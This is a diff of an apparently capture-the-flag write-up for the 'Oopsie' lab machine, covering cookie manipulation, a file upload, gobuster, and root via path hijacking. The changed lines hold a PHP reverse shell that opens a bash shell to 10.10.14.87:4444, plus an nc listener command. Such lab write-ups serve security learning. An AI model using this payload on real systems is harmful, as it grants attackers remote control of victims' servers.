@@ -31,16 +31,15 @@ I used **cookie manipulation** to access some features that guest cannot. That f
 
 ![Icon](/assets/img/Oopsie/icon.pn
 
-Here is my PHP reverse shell that i use:
+Here is my PHP reverse shell that i use : ```<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.87/4444 0>&1'"); ?>```.
 
-```
-<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.87/4444 0>&1'"); ?>
-```
 Can't find any subdirectory of "upload" so I use **gobuster** :
 
 ![gobuster](/assets/img/Oopsie/gobuster.png)
 
 and that actually found an exact url to uploaded folder. 
+
+
 
 
 After that i prepare my **listener** : ```nc -lvnp 4444```.
@@ -87,6 +86,8 @@ that mean we can ultilize teqnique called **"Path Hijacking"**.
 then run the program again, this time we escalate as root
 
 ![pathhijac](path_hijacking.png)
+
+
 
 Root flag can be found at ```/root```
 
